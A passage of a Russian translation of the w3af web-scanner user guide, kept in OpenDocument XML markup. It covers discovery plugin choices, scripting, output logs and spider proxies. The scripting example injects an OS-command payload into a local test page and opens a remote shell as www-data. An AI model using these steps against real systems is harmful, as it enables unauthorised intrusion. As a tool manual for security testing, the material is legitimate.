        <text:p text:style-name="P17">- http://localhost/beef/hook/beefmagic.js.php</text:p>
        <text:p text:style-name="P17">- http://localhost/w3af/globalRedirect/2.php</text:p>
        <text:p text:style-name="P25"><text:span text:style-name="T27">- </text:span><text:span text:style-name="T24">http://localhost/w3af/webSpider/11.html</text:span></text:p>
        <text:p text:style-name="P17">...</text:p>
        <text:p text:style-name="P25"><text:span text:style-name="T20">А в секции отчёта будет информация о местах с возможными инъекционными уязвимостями, которые будут использованы </text:span><text:span text:style-name="T20">audit</text:span><text:span text:style-name="T20">-плагинами:</text:span></text:p>
        <text:p text:style-name="P11"/>
        <text:p text:style-name="P34">Found 78 URLs and 102 different points of injection.</text:p>
        <text:p text:style-name="P34">The list of Fuzzable requests is:</text:p>
        <text:p text:style-name="P34">http://localhost/w3af/ | Method: GET</text:p>
        <text:p text:style-name="P34">http://localhost/w3af/responseSplitting/responseSplitting.php</text:p>
        <text:p text:style-name="P34">| Method: GET | Parameters: (header)</text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T27">– </text:span><text:span text:style-name="T24">http://localhost/w3af/sqli/dataReceptor.php | Method: POST | Parameters: (user,firstname)</text:span></text:p>
        <text:p text:style-name="P34"/>
        <text:p text:style-name="P11">По окончании работы приложения пользователь возвращается в командную строку.</text:p>
        <text:p text:style-name="P19"/>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af&gt;&gt;&gt; </text:span><text:span text:style-name="T24">exit</text:span></text:p>
        <text:p text:style-name="P34">w3af, better than the regular script kiddie.</text:p>
        <text:p text:style-name="P33">$</text:p>
        <text:p text:style-name="P35"/>
        <text:p text:style-name="Heading_20_1">Предупреждение об исследовании</text:p>
        <text:p text:style-name="P25"><text:span text:style-name="T20">Фаза исследований это палка о двух концах: если использовать её с умом то можно получить много информации о веб-приложении, а пользоваться этим безрассудно то можно прождать несколько часов и получить небольшой результат. Скажу более </text:span><text:soft-page-break/><text:span text:style-name="T20">понятно — безрассудный вариант это например активация всех </text:span><text:span text:style-name="T20">discovery</text:span><text:span text:style-name="T20">-плагинов ( “discovery all” ) без чёткого понимания того что они делают. </text:span></text:p>
        <text:p text:style-name="P11">Вот несколько примеров исследования сайтов и рекомендаций по ним:</text:p>
        <text:p text:style-name="P11"/>
        <text:p text:style-name="P25"><text:span text:style-name="T20"><text:tab/>1. “Вы тестируйте веб-приложение во внутренней сети. Оно имеет большую структуру и не использует </text:span><text:span text:style-name="T20">Flash</text:span><text:span text:style-name="T20"> или </text:span><text:span text:style-name="T20">JavaScript</text:span><text:span text:style-name="T20">-код.</text:span></text:p>
        <text:p text:style-name="P25"><text:span text:style-name="T29">Рекомендация</text:span><text:span text:style-name="T29"> : </text:span><text:span text:style-name="T30">Вам</text:span><text:span text:style-name="T30"> </text:span><text:span text:style-name="T30">нужна</text:span><text:span text:style-name="T30"> </text:span><text:span text:style-name="T30">команда</text:span><text:span text:style-name="T29"> </text:span><text:span text:style-name="T20">“discovery all,!spiderMan, !fingerGoogle, !fingerMSN, !fingerPKS, !MSNSpider, !googleSpider, !phishtank, !googleSafeBrowsing”.</text:span></text:p>
        <text:p text:style-name="P25"><text:span text:style-name="T29">Причина: </text:span><text:span text:style-name="T30">Плагин </text:span><text:span text:style-name="T20">Spiderman должен быть использован только тогда когда </text:span><text:span text:style-name="T20">webSpider</text:span><text:span text:style-name="T20"> не может найти ссылок. Плагины </text:span><text:span text:style-name="T20">F</text:span><text:span text:style-name="T20">ingerGoogle, </text:span><text:span text:style-name="T20">F</text:span><text:span text:style-name="T20">ingerMSN и </text:span><text:span text:style-name="T20">F</text:span><text:span text:style-name="T20">ingerPKS ищут почтовые адреса в поисковиках. Если веб-приложение находится во внутренней сети то адреса, находящиеся на его страницах, никогда не попадут к ним. Плагины MSNSpider и googleSpider ищут ссылки с помощью соответствующих поисковых систем. Их не нужно использовать по той же причине. Плагины phishtank и googleSafeBrowsing сделаны для поиска фишинговых сайтов, но так как сайт с приложением находится во внутренней сети то он не может быть проверен поисковиком. </text:span></text:p>
        <text:p text:style-name="P25"><text:span text:style-name="T21"><text:tab/>2. <text:s/></text:span><text:span text:style-name="T20">“Вы тестируйте веб-приложение в интернете. Оно имеет большую структуру и не содержит элементов Flash и JavaScript-кода</text:span></text:p>
        <text:p text:style-name="P25"><text:span text:style-name="T29">Рекомендация</text:span><text:span text:style-name="T29"> </text:span><text:span text:style-name="T20">: </text:span><text:span text:style-name="T20">Вам</text:span><text:span text:style-name="T20"> </text:span><text:span text:style-name="T20">нужна</text:span><text:span text:style-name="T20"> </text:span><text:span text:style-name="T20">команда</text:span><text:span text:style-name="T20"> “discovery all,!spiderMan, !wordnet , !googleSets”.</text:span></text:p>
        <text:p text:style-name="P25"><text:span text:style-name="T29">Причина: </text:span><text:span text:style-name="T30">Плагин</text:span><text:span text:style-name="T29"> </text:span><text:span text:style-name="T20">Spiderman должен быть задействован только тогда когда плагин </text:span><text:span text:style-name="T20">webSpider</text:span><text:span text:style-name="T20"> не может сам обнаружить ссылок на главной странице. </text:span><text:span text:style-name="T20">W</text:span><text:span text:style-name="T20">ordnet и googleSets работают очень долго при работе в интернете, поэтому их отключение является хорошей идеей.</text:span></text:p>
        <text:p text:style-name="P25"><text:span text:style-name="T21"><text:tab/>3. </text:span><text:span text:style-name="T20">“Вы тестируйте веб-приложение в интернете. Оно большое и содержит элементы </text:span><text:span text:style-name="T20">Flash</text:span><text:span text:style-name="T20"> или </text:span><text:span text:style-name="T20">JavaScript</text:span><text:span text:style-name="T20">-кода. Так же вы знаете что приложение не реализует какой-либо веб-сервис. </text:span></text:p>
        <text:p text:style-name="P25"><text:span text:style-name="T29">Рекомендация</text:span><text:span text:style-name="T29"> </text:span><text:span text:style-name="T20">:</text:span><text:span text:style-name="T20">Вам</text:span><text:span text:style-name="T20"> </text:span><text:span text:style-name="T20">нужна</text:span><text:span text:style-name="T20"> </text:span><text:span text:style-name="T20">команда</text:span><text:span text:style-name="T20"> “discovery all, !wordnet , !googleSets, !wsdlFinder”.</text:span></text:p>
        <text:p text:style-name="P25"><text:span text:style-name="T29">Причина: </text:span><text:span text:style-name="T30">Плагины</text:span><text:span text:style-name="T20"> wordnet и googleSets отнимают много времени на выполнение в интернете, поэтому их отключение является хорошей идеей.</text:span></text:p>
        <text:p text:style-name="P11">А wsdlFinder не нужно включать если мы итак знаем что веб-сервисов на сайте нет.</text:p>
        <text:p text:style-name="P25"><text:span text:style-name="T21"><text:tab/>4. </text:span><text:span text:style-name="T20">“Вы проверяете приложение в интернет. Вам требуется узнать досконально всё о его функционале и вы не ограничены временем.</text:span></text:p>
        <text:p text:style-name="P25"><text:span text:style-name="T29">Рекомендация </text:span><text:span text:style-name="T20">: Используйте команду “discovery all” .</text:span></text:p>
        <text:p text:style-name="P25"><text:span text:style-name="T29">Причина: </text:span><text:span text:style-name="T30">вы хотите узнать о сайте как можно больше и не боитесь потратить на это пару дней. </text:span></text:p>
        <text:p text:style-name="Heading_20_1">Когда ничего не получается...</text:p>
        <text:p text:style-name="P25"><text:span text:style-name="T20">Итак. Вы активировали рекомендуемые плагины, запустили сканирование час назад, но до сих пор ничего не найдено. Когда вы окажитесь в такой ситуации у Вас будет 2 выхода — ждать пока </text:span><text:span text:style-name="T20">w</text:span><text:span text:style-name="T20">3</text:span><text:span text:style-name="T20">af</text:span><text:span text:style-name="T20"> закончит сканирование или нажать </text:span><text:span text:style-name="T20">CTRL</text:span><text:span text:style-name="T20">+</text:span><text:span text:style-name="T20">C</text:span><text:span text:style-name="T20"> сбросив текущие задачи исследования и запустить фазу аудита.</text:span></text:p>
        <text:p text:style-name="P11">Так же вы должны помнить что если вы сохраняете отладочную информацию в текстовом файле то можете открыть новое окно терминала и набрать</text:p>
        <text:p text:style-name="P25"><text:span text:style-name="T20"><text:s/></text:span><text:span text:style-name="T20">“tail -f w3af-output-file.txt”. </text:span><text:span text:style-name="T20">После запуска этой команды вы увидите что на самом деле происходит с </text:span><text:span text:style-name="T20">w</text:span><text:span text:style-name="T20">3</text:span><text:span text:style-name="T20">af</text:span><text:span text:style-name="T20"> и возможно выявите причину его неработоспособности.</text:span></text:p>
        <text:p text:style-name="P11"/>
        <text:p text:style-name="Heading_20_1"><text:soft-page-break/>Скрипты в w3af </text:p>
        <text:p text:style-name="P25"><text:span text:style-name="T20">При разработке w3af я понял, что программе нужен способ выполнять какие-либо часто повторяющиеся действия. Поэтому я включил в функционал фреймворка поддержку скриптов. w3af может запустить скрипт с использованием параметра «-s». Файл скрипта должен представлять из себя текстовый файл с набором команд.</text:span></text:p>
        <text:p text:style-name="P11">Пример содержимого такого файла:</text:p>
        <text:p text:style-name="P11"/>
        <text:p text:style-name="P31"><text:span text:style-name="T23">$ </text:span><text:span text:style-name="T24">head scripts/scriptosCommanding.w3af</text:span></text:p>
        <text:p text:style-name="P34"># This is the osCommanding demo:</text:p>
        <text:p text:style-name="P34">plugins</text:p>
        <text:p text:style-name="P34">output console,textFile</text:p>
        <text:p text:style-name="P34">output</text:p>
        <text:p text:style-name="P34">output config textFile</text:p>
        <text:p text:style-name="P34">set fileName outputw3af.</text:p>
        <text:p text:style-name="P34">txt</text:p>
        <text:p text:style-name="P34">set verbose True</text:p>
        <text:p text:style-name="P34">back</text:p>
        <text:p text:style-name="P11"/>
        <text:p text:style-name="P25"><text:span text:style-name="T20">Для запуска этого скрипта вы должны выполнить команду «</text:span><text:span text:style-name="T24">./w3af_console -s</text:span></text:p>
        <text:p text:style-name="P25"><text:span text:style-name="T24">scripts/scriptosCommanding.w3af».</text:span><text:span text:style-name="T20"> Результат будет тот же самый как если бы вы вводили все эти команды вручную: </text:span></text:p>
        <text:p text:style-name="P32"/>
        <text:p text:style-name="P31"><text:span text:style-name="T23">$ </text:span><text:span text:style-name="T24">./w3af_console -s scripts/scriptosCommanding.w3af</text:span></text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af&gt;&gt;&gt;</text:span><text:span text:style-name="T24">plugins</text:span></text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af/plugins&gt;&gt;&gt;</text:span><text:span text:style-name="T24">output console,textFile</text:span></text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af/plugins&gt;&gt;&gt;</text:span><text:span text:style-name="T24">output</text:span></text:p>
        <text:p text:style-name="P34">...</text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af/plugins&gt;&gt;&gt;</text:span><text:span text:style-name="T24">output config textFile</text:span></text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af/plugins/output/config:textFile&gt;&gt;&gt;</text:span><text:span text:style-name="T24">set fileName outputw3af.txt</text:span></text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af/plugins/outpu</text:span><text:span text:style-name="T23">t/config:textFile&gt;&gt;&gt;</text:span><text:span text:style-name="T24">set verbose True</text:span></text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af/plugins/output/config:textFile&gt;&gt;&gt;</text:span><text:span text:style-name="T24">back</text:span></text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af/plugins&gt;&gt;&gt;</text:span><text:span text:style-name="T24">output config console</text:span></text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af/plugins/output/config:console&gt;&gt;&gt;</text:span><text:span text:style-name="T24">set verbose False</text:span></text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af/plugins/output/config:console&gt;&gt;&gt;</text:span><text:span text:style-name="T24">back</text:span></text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af/plugins&gt;&gt;&gt;</text:span><text:span text:style-name="T24">back</text:span></text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af&gt;&gt;&gt;</text:span><text:span text:style-name="T24">plugins</text:span></text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af/plugins&gt;&gt;&gt;</text:span><text:span text:style-name="T24">audit osCommanding</text:span></text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af/plugins&gt;&gt;&gt;</text:span><text:span text:style-name="T24">back</text:span></text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af&gt;&gt;&gt;</text:span><text:span text:style-name="T24">target</text:span></text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af/config:target&gt;&gt;&gt;</text:span><text:span text:style-name="T24">set target</text:span></text:p>
        <text:p text:style-name="P34">http://localhost/w3af/osCommanding/vulnerable.php?command=f0as9</text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af/config:target&gt;&gt;&gt;</text:span><text:span text:style-name="T24">back</text:span></text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af&gt;&gt;&gt;</text:span><text:span text:style-name="T24">start</text:span></text:p>
        <text:p text:style-name="P34">Found 1 URLs and 1 different points of injection.</text:p>
        <text:p text:style-name="P34">The list of URLs is:</text:p>
        <text:p text:style-name="P34">http://localhost/w3af/osCommanding/vulnerable.php</text:p>
        <text:p text:style-name="P34">The list of fuzzable requests is:</text:p>
        <text:p text:style-name="P34">http://localhost/w3af/osCommanding/vulnerable.php | Method:</text:p>
        <text:p text:style-name="P34">GET | Parameters: (command)</text:p>
        <text:p text:style-name="P34">Starting osCommanding plugin execution.</text:p>
        <text:p text:style-name="P34"><text:soft-page-break/>OS Commanding was found at: "http://localhost/w3af/osCommanding/</text:p>
        <text:p text:style-name="P34">vulnerable.php", using HTTP method GET. The sent data was:</text:p>
        <text:p text:style-name="P34">"command=+ping+c+</text:p>
        <text:p text:style-name="P34">9+localhost". The vulnerability was found in</text:p>
        <text:p text:style-name="P34">the request with id 5.</text:p>
        <text:p text:style-name="P34">Finished scanning process.</text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af&gt;&gt;&gt;</text:span><text:span text:style-name="T24">exploit</text:span></text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af/exploit&gt;&gt;&gt;</text:span><text:span text:style-name="T24">exploit osCommandingShell</text:span></text:p>
        <text:p text:style-name="P34">osCommandingShell exploit plugin is starting.</text:p>
        <text:p text:style-name="P34">The vulnerability was found using method GET, tried to change</text:p>
        <text:p text:style-name="P34">the method to POST for exploiting but failed.</text:p>
        <text:p text:style-name="P34">Vulnerability successfully exploited. This is a list of</text:p>
        <text:p text:style-name="P34">available shells:</text:p>
        <text:p text:style-name="P34">[0] &lt;osCommandingShell object (ruser: "wwwdata"| rsystem:"Linux brick 2.6.2419generic i686 GNU/Linux")&gt;</text:p>
        <text:p text:style-name="P34">Please use the interact command to interact with the shell objects.</text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af/exploit&gt;&gt;&gt;</text:span><text:span text:style-name="T24">interact 0</text:span></text:p>
        <text:p text:style-name="P34">Execute "endInteraction" to get out of the remote shell. Commands typed in this menu will be runned on the remote web server.</text:p>
        <text:p text:style-name="P33">w3af/exploit/osCommandingShell0&gt;&gt;&gt;</text:p>
        <text:p text:style-name="P34">ls</text:p>
        <text:p text:style-name="P34">vulnerable.php</text:p>
        <text:p text:style-name="P34">vulnerable2.php</text:p>
        <text:p text:style-name="P34">w3afAgentClient.log</text:p>
        <text:p text:style-name="P33">w3af/exploit/osCommandingShell0&gt;&gt;&gt;</text:p>
        <text:p text:style-name="P34">endInteraction</text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af/exploit&gt;&gt;&gt;</text:span><text:span text:style-name="T24">back</text:span></text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af&gt;&gt;&gt;</text:span><text:span text:style-name="T24">exit</text:span></text:p>
        <text:p text:style-name="P34">spawned a remote shell today?</text:p>
        <text:p text:style-name="P33">$</text:p>
        <text:p text:style-name="P32"/>
        <text:p text:style-name="Heading_20_1">Вывод информации</text:p>
        <text:p text:style-name="P11">Вся выводимая приложением информация управляется output-плагинами. Каждый такой плагин может записывать информацию в различных форматах (txt, html и т.д). Для примера — плагин «textFile» по умолчанию пишет всю исходящую информацию в файл output-w3af.txt. Конфигурация таких плагинов происходит так же как и остальных, рассматриваемых нами выше. </text:p>
        <text:p text:style-name="P33"/>
        <text:p text:style-name="P31"><text:span text:style-name="T23">$ </text:span><text:span text:style-name="T24">./w3af_console</text:span></text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af&gt;&gt;&gt; </text:span><text:span text:style-name="T24">plugins</text:span></text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af/plugins&gt;&gt;&gt; </text:span><text:span text:style-name="T24">output console,textFile</text:span></text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af/plugins&gt;&gt;&gt; </text:span><text:span text:style-name="T24">output config textFile</text:span></text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af/plugins/output/config:textFile&gt;&gt;&gt; </text:span><text:span text:style-name="T24">set fileName outputw3af.</text:span></text:p>
        <text:p text:style-name="P34">txt</text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af/plugins/output/config:textFile&gt;&gt;&gt; </text:span><text:span text:style-name="T24">set verbose True</text:span></text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af/plugins/output/config:textFile&gt;&gt;&gt; </text:span><text:span text:style-name="T24">back</text:span></text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af/plugins&gt;&gt;&gt; </text:span><text:span text:style-name="T24">output config console</text:span></text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af/plugins/output/config:console&gt;&gt;&gt; </text:span><text:span text:style-name="T24">set verbose False</text:span></text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af/plugins/output/config:console&gt;&gt;&gt; </text:span><text:span text:style-name="T24">back</text:span></text:p>
        <text:p text:style-name="P34"><text:soft-page-break/></text:p>
        <text:p text:style-name="P25"><text:span text:style-name="T20">Такие настройки укажут плагину «textFile» что нужно выводить все сообщения включая отладочную информацию в файл </text:span><text:span text:style-name="T24">“outputw3af.txt”. А вот пример того что в этот файл будет помещаться</text:span><text:span text:style-name="T20">:</text:span></text:p>
        <text:p text:style-name="P11"/>
        <text:p text:style-name="P34">[ Sun Sep 14 17:36:09 2008 debug w3afCore] Exiting setOutputPlugins()</text:p>
        <text:p text:style-name="P34">[ Sun Sep 14 17:36:09 2008 debug w3afCore] Called w3afCore.start()</text:p>
        <text:p text:style-name="P34">[ Sun Sep 14 17:36:09 2008 debug xUrllib] Called buildOpeners</text:p>
        <text:p text:style-name="P34">[ Sun Sep 14 17:36:09 2008 debug keepalive] keepalive: Theconnection manager has 0 active connections.</text:p>
        <text:p text:style-name="P34">[ Sun Sep 14 17:36:09 2008 debug keepalive] keepalive: added one connection, len(self._hostmap["localhost"]): 1 </text:p>
        <text:p text:style-name="P34">[ Sun Sep 14 17:36:09 2008 debug httplib] DNS response from DNS server for domain: localhost</text:p>
        <text:p text:style-name="P34">[ Sun Sep 14 17:36:09 2008 debug xUrllib] GET http://localhost/w3af/osCommanding/vulnerable.php?command=f0as9 returned HTTP code "200" </text:p>
        <text:p text:style-name="P34"/>
        <text:p text:style-name="P25"><text:span text:style-name="T20">Output-плагины так же могут записывать и содержимое </text:span><text:span text:style-name="T20">HTTP</text:span><text:span text:style-name="T20">-запросов и ответов. <text:s/>Каждый плагин работает с этой информацией по разному. Например, плагин textFile пишет все запросы и ответы в файл, тогда как htmlFile-плагин равнодушен к этой информации и просто ничего с ней не делает. Рассмотрим пример лог-файла плагина textFile:</text:span></text:p>
        <text:p text:style-name="P11"/>
        <text:p text:style-name="P34">==========Request 4 Sun Sep 14 17:36:12 2008==============</text:p>
        <text:p text:style-name="P34">GET http://localhost/w3af/osCommanding/vulnerable.php?</text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T24">command=+p</text:span><text:span text:style-name="T24">ing+c+</text:span></text:p>
        <text:p text:style-name="P34">4+localhost HTTP/1.1</text:p>
        <text:p text:style-name="P34">Host: localhost</text:p>
        <text:p text:style-name="P34">Acceptencoding:</text:p>
        <text:p text:style-name="P34">identity</text:p>
        <text:p text:style-name="P34">Accept: */*</text:p>
        <text:p text:style-name="P34">Useragent:</text:p>
        <text:p text:style-name="P34">w3af.sourceforge.net</text:p>
        <text:p text:style-name="P34">==========Response 4 Sun Sep 14 17:36:12 2008==============</text:p>
        <text:p text:style-name="P34">HTTP/1.1 200 OK</text:p>
        <text:p text:style-name="P34">date: Sun, 14 Sep 2008 20:36:09 GMT</text:p>
        <text:p text:style-name="P34">transferencoding:</text:p>
        <text:p text:style-name="P34">chunked</text:p>
        <text:p text:style-name="P34">xpoweredby:</text:p>
        <text:p text:style-name="P34">PHP/5.2.42ubuntu5.3</text:p>
        <text:p text:style-name="P34">contenttype:</text:p>
        <text:p text:style-name="P34">text/html</text:p>
        <text:p text:style-name="P34">server: Apache/2.2.8 (Ubuntu) mod_python/3.3.1 Python/2.5.2 PHP/</text:p>
        <text:p text:style-name="P34">5.2.42ubuntu5.3</text:p>
        <text:p text:style-name="P34">with SuhosinPatch</text:p>
        <text:p text:style-name="P34">PING localhost (127.0.0.1) 56(84) bytes of data.</text:p>
        <text:p text:style-name="P34">64 bytes from localhost (127.0.0.1): icmp_seq=1 ttl=64</text:p>
        <text:p text:style-name="P34">time=0.024 ms</text:p>
        <text:p text:style-name="P34">64 bytes from localhost (127.0.0.1): icmp_seq=2 ttl=64</text:p>
        <text:p text:style-name="P34"><text:soft-page-break/>time=0.035 ms</text:p>
        <text:p text:style-name="P34">64 bytes from localhost (127.0.0.1): icmp_seq=3 ttl=64</text:p>
        <text:p text:style-name="P34">time=0.037 ms</text:p>
        <text:p text:style-name="P34">64 bytes from localhost (127.0.0.1): icmp_seq=4 ttl=64</text:p>
        <text:p text:style-name="P34">time=0.037 ms</text:p>
        <text:p text:style-name="P34">localhost</text:p>
        <text:p text:style-name="P34">ping statistics 4</text:p>
        <text:p text:style-name="P34">packets transmitted, 4 received, 0% packet loss, time 2999ms</text:p>
        <text:p text:style-name="P34">rtt min/avg/max/mdev = 0.024/0.033/0.037/0.006 ms</text:p>
        <text:p text:style-name="P34">=============================================================</text:p>
        <text:p text:style-name="P11"/>
        <text:p text:style-name="P25"><text:span text:style-name="T20">Все сообщения выводимые плагинами или фреймворком попадают ко ВСЕМ активированным </text:span><text:span text:style-name="T20">output</text:span><text:span text:style-name="T20">-плагинам. Так что если вы активируйте одновременно плагины </text:span><text:span text:style-name="T20">textFile</text:span><text:span text:style-name="T20"> и </text:span><text:span text:style-name="T20">htmlFile</text:span><text:span text:style-name="T20"> то они оба будут записывать одну и ту же информацию.</text:span></text:p>
        <text:p text:style-name="P27"/>
        <text:p text:style-name="Heading_20_1">Сложноструктурные сайты. </text:p>
        <text:p text:style-name="P25"><text:span text:style-name="T20">Некоторые сайты содержат в себе специфические объекты типа </text:span><text:span text:style-name="T20">Flash</text:span><text:span text:style-name="T20">-элементов или </text:span><text:span text:style-name="T20">Java</text:span><text:span text:style-name="T20">-апплетов. Это не позволяет получать фреймворку информацию о ссылках стандартным способом. Специально для этого создан скрипт </text:span><text:span text:style-name="T20">spiderMan</text:span><text:span text:style-name="T20">. Он запускает </text:span><text:span text:style-name="T20">http</text:span><text:span text:style-name="T20">-прокси-сервер через который пользователь должен бродить по сайту. В это время скрипт будет извлекать из запросов и ответов сервера нужную ему информацию. </text:span></text:p>
        <text:p text:style-name="P25"><text:span text:style-name="T20">Как пример рассмотрим следующую ситуацию. Допустим что </text:span><text:span text:style-name="T20">w</text:span><text:span text:style-name="T20">3</text:span><text:span text:style-name="T20">af</text:span><text:span text:style-name="T20"> проверил сайт и не нашёл ни одной ссылки на главной странице. После более подробного рассмотрения оказывается что на главной странице находится навигационное меню, представляющее из себя </text:span><text:span text:style-name="T20">Java</text:span><text:span text:style-name="T20">-апплет. Пользователь запускает w3af снова и активирует плагин </text:span><text:span text:style-name="T20">spiderMan</text:span><text:span text:style-name="T20">, после чего бродит по сайту самостоятельно через прокси-сервер созданный этим плагином. Когда он заканчивает </text:span><text:span text:style-name="T20">w</text:span><text:span text:style-name="T20">3</text:span><text:span text:style-name="T20">af</text:span><text:span text:style-name="T20"> запускает </text:span><text:span text:style-name="T20">audit</text:span><text:span text:style-name="T20">-плагины, передавая им ссылки найденные при помощи пользователя. </text:span></text:p>
        <text:p text:style-name="P11">Вот простой пример работы с этим плагином:</text:p>
        <text:p text:style-name="P11"/>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af&gt;&gt;&gt; </text:span><text:span text:style-name="T24">plugins</text:span></text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af/plugins&gt;&gt;&gt; </text:span><text:span text:style-name="T24">discovery spiderMan</text:span></text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af/plugins&gt;&gt;&gt; </text:span><text:span text:style-name="T24">back</text:span></text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af&gt;&gt;&gt; </text:span><text:span text:style-name="T24">target</text:span></text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af/target&gt;&gt;&gt; </text:span><text:span text:style-name="T24">set target http://localhost/w3af/fileUpload/</text:span></text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af/target&gt;&gt;&gt; </text:span><text:span text:style-name="T24">back</text:span></text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af&gt;&gt;&gt; </text:span><text:span text:style-name="T24">start</text:span></text:p>
        <text:p text:style-name="P34">spiderMan proxy is running on 127.0.0.1:44444 .</text:p>
        <text:p text:style-name="P34">Please configure your browser to use these proxy settings and</text:p>
        <text:p text:style-name="P34">navigate the target site. To exit spiderMan plugin please</text:p>
        <text:p text:style-name="P34">navigate to http://127.7.7.7/spiderMan?terminate .</text:p>
        <text:p text:style-name="P32"/>
        <text:p text:style-name="P25"><text:span text:style-name="T20">Теперь пользователь настраивает браузер на использование прокси-сервера по адресу 127.0.0.1:44444 и начинает бродить по сайту, после чего он проходит по ссылке “http://127.7.7.7/spiderMan?terminate”, чем завершает работу </text:span><text:span text:style-name="T20">spiderMan</text:span><text:span text:style-name="T20">. Вот</text:span><text:span text:style-name="T20"> </text:span><text:span text:style-name="T20">результат</text:span><text:span text:style-name="T20">:</text:span></text:p>
        <text:p text:style-name="P34"/>
        <text:p text:style-name="P34">New URL found by discovery: http://localhost/w3af/test</text:p>
        <text:p text:style-name="P34"><text:soft-page-break/>New URL found by discovery: http://localhost/favicon.ico</text:p>
        <text:p text:style-name="P34">New URL found by discovery: http://localhost/w3af/</text:p>
        <text:p text:style-name="P34">New URL found by discovery: http://localhost/w3af/img/w3af.png</text:p>
        <text:p text:style-name="P34">New URL found by discovery: http://localhost/w3af/xssforms/testforms.html</text:p>
        <text:p text:style-name="P34">New URL found by discovery: http://localhost/w3af/xssforms/dataReceptor.php</text:p>
        <text:p text:style-name="P34">The list of found URLs is:</text:p>
        <text:p text:style-name="P34">http://localhost/w3af/fileUpload/</text:p>
        <text:p text:style-name="P34">http://localhost/w3af/test</text:p>
        <text:p text:style-name="P34">http://localhost/w3af/xssforms/dataReceptor.php</text:p>
        <text:p text:style-name="P34">http://localhost/w3af/</text:p>
        <text:p text:style-name="P34">http://localhost/w3af/img/w3af.png</text:p>
        <text:p text:style-name="P34">http://localhost/w3af/xssforms/testforms.html</text:p>
        <text:p text:style-name="P34">http://localhost/w3af/fileUpload/uploader.php</text:p>
        <text:p text:style-name="P34">http://localhost/favicon.ico</text:p>
        <text:p text:style-name="P34">Found 8 URLs and 8 different points of injection.</text:p>
        <text:p text:style-name="P34">The list of Fuzzable requests is:</text:p>
        <text:p text:style-name="P34">http://localhost/w3af/fileUpload/ | Method: GET</text:p>
        <text:p text:style-name="P34">http://localhost/w3af/fileUpload/uploader.php | Method: POST | Parameters: (MAX_FILE_SIZE,uploadedfile)</text:p>
        <text:p text:style-name="P34">http://localhost/w3af/test | Method: GET</text:p>
        <text:p text:style-name="P34">http://localhost/favicon.ico | Method: GET</text:p>
        <text:p text:style-name="P34">http://localhost/w3af/ | Method: GET</text:p>
        <text:p text:style-name="P34">http://localhost/w3af/img/w3af.png | Method: GET</text:p>
        <text:p text:style-name="P34">http://localhost/w3af/xssforms/testforms.html | Method: GET</text:p>
        <text:p text:style-name="P34">http://localhost/w3af/xssforms/dataReceptor.php | Method:POST | Parameters: (user,firstname)</text:p>
        <text:p text:style-name="P34">Starting sqli plugin execution.</text:p>
        <text:p text:style-name="P33">W3af&gt;&gt;&gt;</text:p>
        <text:p text:style-name="P28"/>
        <text:p text:style-name="Heading_20_1">Эксплуатация найденных уязвимостей</text:p>
        <text:p text:style-name="P25"><text:span text:style-name="T20">Существует два пути использования уязвимостей. Первый заключается в том чтобы дождаться фазы аудита, а второй в том чтобы вызывать </text:span><text:span text:style-name="T20">exploit</text:span><text:span text:style-name="T20">-плагин напрямую, указывая нужные ему параметры.</text:span></text:p>
        <text:p text:style-name="P25"><text:span text:style-name="T20">Давайте посмотрим на пример первого пути — эксплуатации уязвимостей автоматическими механизмами </text:span><text:span text:style-name="T20">w</text:span><text:span text:style-name="T20">3</text:span><text:span text:style-name="T20">af</text:span><text:span text:style-name="T20">: </text:span></text:p>
        <text:p text:style-name="P11"/>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af&gt;&gt;&gt;</text:span><text:span text:style-name="T24">plugins</text:span></text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af/plugins&gt;&gt;&gt;</text:span><text:span text:style-name="T24">audit osCommanding</text:span></text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af/plugins&gt;&gt;&gt;</text:span><text:span text:style-name="T24">back</text:span></text:p>
